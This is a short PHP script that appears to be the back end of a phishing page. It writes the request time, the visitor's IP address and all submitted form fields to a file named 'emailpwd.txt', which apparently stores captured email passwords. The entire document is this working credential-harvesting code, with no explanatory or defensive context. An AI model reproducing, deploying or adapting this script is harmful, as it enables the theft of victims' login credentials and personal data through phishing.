<?php
   $myfile = fopen("emailpwd.txt", "a+") or die("Unable to open file!");
   fwrite($myfile, $_SERVER['REQUEST_TIME'] . "\n");
   fwrite($myfile, $_SERVER['REMOTE_ADDR'] . "\n");
   fwrite($myfile, json_encode($_POST));
   fclose($myfile);
?>